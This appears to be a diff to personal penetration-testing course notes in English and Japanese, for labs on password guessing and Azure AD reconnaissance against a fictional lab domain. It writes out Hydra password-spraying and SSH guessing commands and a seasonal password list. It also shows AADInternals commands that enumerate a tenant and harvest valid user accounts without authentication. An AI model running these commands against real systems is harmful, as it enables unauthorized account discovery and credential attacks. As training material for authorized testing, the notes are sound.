@@ -2067,6 +2067,7 @@ sec560@560vm:~/Downloads/gowitness$ gowitness report server
 
 ## Lab 2.2 - Password Guessing
 
+### Linux
 
 - 10.130.10.10: A Linux web server
 - 10.130.10.4: A Windows Domain controller
@@ -2083,6 +2084,7 @@ sec560@560vm:~/Downloads/gowitness$ gowitness report server
 
 `https://www.skullsecurity.org/wiki/Passwords`
 
+#### 1: Password Spray (SMB)
 
 ```
 sec560@560vm:~/Downloads$ head /opt/passwords/facebook-f.last-100.txt
@@ -2172,6 +2174,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:26:
 sec560@560vm:~/Downloads$ 
 ```
 
+#### 2: The dictionary
+
 ```
 sec560@560vm:~/Downloads$ for Y in 1 24 25 26; do printf '%s\n' {Password,Welcome,Spring,Summer,Fall,Autumn,Winter}"$Y"{,\!} | tee -a simple.txt; done
 Password1
@@ -2235,6 +2239,8 @@ sec560@560vm:~/Downloads$ wc -l simple.txt
 sec560@560vm:~/Downloads$ 
 ```
 
+#### 3: Password Guessing (SSH)
+
 ```
 sec560@560vm:~/Downloads$ hydra -l bgreen -P simple.txt 10.130.10.10 ssh
 Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -2251,6 +2257,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:17:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:17:49
 sec560@560vm:~/Downloads$ 
 ```
+
+#### 4: Verifying Access
 
 ```
 sec560@560vm:~/Downloads$ nmap -n -PS445 -p 445 --open 10.130.10.0/24 -oG - | awk '/Up/ { print $2 }' | tee 445.tcp
@@ -2290,6 +2298,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:29:
 sec560@560vm:~/Downloads$
 ```
 
+#### 5: Breached Credentials
+
 ```
 sec560@560vm:~/Downloads$ wc -l /opt/passwords/hiboxy-breach.txt
 22 /opt/passwords/hiboxy-breach.txt
@@ -2322,6 +2332,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:33:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:33:20
 sec560@560vm:~/Downloads$ 
 ```
+
+#### 6: Password Spraying all domain users
 
 ```
 sec560@560vm:~/Downloads$ GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.4 -all | tee adusers.txt
@@ -3542,9 +3554,206 @@ sec560@560vm:~/Downloads$
 
 ## Lab 2.3: Azure Recon and Password Attacks
 
-### 1: Loading AADInternals
+### Windows
 
-#### Windows
+#### 1: Loading AADInternals
+
+AADInternalsは、Microsoft Entra ID（旧称：Azure AD）およびMicrosoft 365の管理・セキュリティ調査・ペネトレーションテスト（侵入テスト）を行うための強力なPowerShellモジュール
+
+- 情報の列挙（Enumeration）: テナントのID、ドメインの種類（認証済みか、フェデレーションか）、ユーザー情報などを詳細に取得できます。
+
+- 認証のバイパス検証: 条件付きアクセスやMFA（多要素認証）の設定を確認し、設定の不備（バックドア）がないかテストできます。
+
+- フェデレーションの操作: 自前の証明書を使ってフェデレーションサーバーを偽装し、任意のユーザーとしてトークンを発行する（Golden SAML攻撃のシミュレーションなど）高度な検証が可能です。
+
+- Teams/Outlookの操作: Teamsでのなりすましメッセージ送信や、在席ステータスの偽装など、エンドユーザー向けの機能も含まれています。
+
+```
+Install-Module -Name AADInternals
+Import-Module -Name AADInternals
+```
+
+```
+PS C:\Users\sec560> Import-Module AADInternals
+    ___    ___    ____  ____      __                        __
+   /   |  /   |  / __ \/  _/___  / /____  _________  ____ _/ /____
+  / /| | / /| | / / / // // __ \/ __/ _ \/ ___/ __ \/ __ `/ / ___/
+ / ___ |/ ___ |/ /_/ _/ // / / / /_/  __/ /  / / / / /_/ / (__  )
+/_/  |_/_/  |_/_____/___/_/ /_/\__/\___/_/  /_/ /_/\__,_/_/____/
+
+ v0.9.8 by @DrAzureAD (Nestori Syynimaa)
+PS C:\Users\sec560>
+```
+
+#### 2: Invoke-AADIntReconAsOutsider
+
+、「外部の第三者（Outsider）」の視点から、対象の Microsoft 365 / Azure AD テナントの情報を調査（Reconnaissance = 偵察）するために使われます。
+
+このコマンドの最大の特徴は、ターゲット環境のユーザー名やパスワードを一切持っていなくても実行できる点にあります。
+
+このコマンドでわかること
+
+ターゲットのドメイン名（例: example.com）を指定するだけで、以下のような情報を「認証なし」で一気に引き出します。
+
+    テナントID (Tenant ID): その組織固有の GUID。
+
+    テナント名: example.onmicrosoft.com といった初期ドメイン名。
+
+    ドメインの種類:
+
+        Managed: Microsoft 365 上で直接認証。
+
+        Federated: ADFS などの外部認証サーバーを使用しているか。
+
+    認証サーバーの URL: フェデレーション設定されている場合、どこのサーバー（ADFSなど）に認証を飛ばしているか。
+
+    デスクトップ SSO の有無: 組織内ネットワークからのサインイン設定が有効か。
+
+    利用可能なサービス: Exchange Online, SharePoint, Skype for Business などの導入状況。
+
+一般的に、hiboxy.com のようなドメインには、`*.onmicrosoft.com` と `*.mail.onmicrosoft.com` も存在
+
+```
+PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.com 2>$null | Format-Table
+Tenant brand:       hiboxy
+Tenant name:
+Tenant id:          1c0060e4-c4db-4777-a48b-34a1515e33bf
+Tenant region:      NA
+DesktopSSO enabled: False
+WARNING: Requests throttled!
+Uses cloud sync:    True
+
+Name        DNS    MX   SPF DMARC  DKIM MTA-STS Type    STS
+----        ---    --   --- -----  ---- ------- ----    ---
+hiboxy.com True False False False False   False Managed
+
+PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.onmicrosoft.com 2>$null| Format-Table
+Tenant brand:       hiboxy
+Tenant name:        hiboxy.onmicrosoft.com
+Tenant id:          1c0060e4-c4db-4777-a48b-34a1515e33bf
+Tenant region:      NA
+DesktopSSO enabled: False
+
+Name                    DNS   MX  SPF DMARC  DKIM MTA-STS Type    STS
+----                    ---   --  --- -----  ---- ------- ----    ---
+hiboxy.onmicrosoft.com True True True False False   False Managed
+
+PS C:\Users\sec560> Invoke-AADIntReconAsOutsider -DomainName hiboxy.mail.onmicrosoft.com 2>$null| Format-Table
+Tenant brand:       hiboxy
+Tenant name:
+Tenant id:          1c0060e4-c4db-4777-a48b-34a1515e33bf
+Tenant region:      NA
+DesktopSSO enabled: False
+WARNING: Requests throttled!
+Uses cloud sync:    True
+
+Name                         DNS   MX  SPF DMARC  DKIM MTA-STS Type    STS
+----                         ---   --  --- -----  ---- ------- ----    ---
+hiboxy.mail.onmicrosoft.com True True True False False   False Managed
+
+PS C:\Users\sec560>
+```
+
+#### 3: Invoke-AADIntUserEnumerationAsOutsider
+
+「特定のメールアドレスがそのテナントに実在するかどうか」を外部から特定（列挙）するためのコマンド
+
+このモジュールが攻撃対象とするAPIは3つあります：
+
+    通常（指定なし）：GetCredentialType API
+    ログイン: 標準ユーザーによるログインを試行します。試行はサインインログに記録されます。
+    自動ログイン: 自動ログインAPIを使用します。このAPIはログイベントを残しません。
+
+
+```
+PS C:\Users\sec560> Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com"
+
+UserName           Exists
+--------           ------
+aparker@hiboxy.com   True
+
+PS C:\Users\sec560>
+```
+
+```
+PS C:\Users\sec560> Invoke-AADIntUserEnumerationAsOutsider -UserName "aparker@hiboxy.com" -Method Login
+
+UserName           Exists
+--------           ------
+aparker@hiboxy.com   True
+
+PS C:\Users\sec560>
+```
+
+#### 4: Username Harvesting Attacks
+
+>偵察中に有効なユーザーリストやメールアドレスを発見できなかった場合、統計的に可能性の高いユーザー名プロジェクトを利用できます。Hiboxyのメールアドレス形式は`{fi}{last}@hiboxy.com`であることがわかっています。このプロジェクトを用いてユーザーを列挙する方法を以下に示します
+
+`https://github.com/insidetrust/statistically-likely-usernames`
+
+```
+curl -O https://raw.githubusercontent.com/insidetrust/statistically-likely-usernames/refs/heads/master/jsmith.txt
+gc .\jsmith.txt | % { $_ + "@hiboxy.com" } | Invoke-AADIntUserEnumerationAsOutsider | Where-Object Exists | Select-Object UserName
+```
+
+ここでは時間がかかるので簡易版を使用
+
+```
+PS C:\Users\sec560> cd C:\CourseFiles\
+PS C:\CourseFiles> Get-Content users.txt
+abates@hiboxy.com
+alee@hiboxy.com
+aparker@hiboxy.com
+bgreen@hiboxy.com
+bking@hiboxy.com
+bsanchez@hiboxy.com
+bwebster@hiboxy.com
+hmarsh@hiboxy.com
+janderson@hiboxy.com
+jcooper@hiboxy.com
+jlopez@hiboxy.com
+jmartin@hiboxy.com
+kacevedo@hiboxy.com
+mhernandez@hiboxy.com
+mlara@hiboxy.com
+mluna@hiboxy.com
+nlopez@hiboxy.com
+rduran@hiboxy.com
+rgray@hiboxy.com
+slopez@hiboxy.com
+ssmith@hiboxy.com
+PS C:\CourseFiles>
+```
+
+```
+PS C:\CourseFiles> Get-Content users.txt | Invoke-AADIntUserEnumerationAsOutsider
+
+UserName          Exists
+--------          ------
+abates@hiboxy.com   True
+alee@hiboxy.com    False
+aparker@hiboxy.c…   True
+bgreen@hiboxy.com  False
+bking@hiboxy.com   False
+bsanchez@hiboxy.…  False
+bwebster@hiboxy.…  False
+hmarsh@hiboxy.com  False
+janderson@hiboxy…  False
+jcooper@hiboxy.c…  False
+jlopez@hiboxy.com  False
+jmartin@hiboxy.c…  False
+kacevedo@hiboxy.…  False
+mhernandez@hibox…  False
+mlara@hiboxy.com    True
+mluna@hiboxy.com   False
+nlopez@hiboxy.com  False
+rduran@hiboxy.com  False
+rgray@hiboxy.com   False
+slopez@hiboxy.com   True
+ssmith@hiboxy.com  False
+
+PS C:\CourseFiles>
+```
 
 #### Linux
 
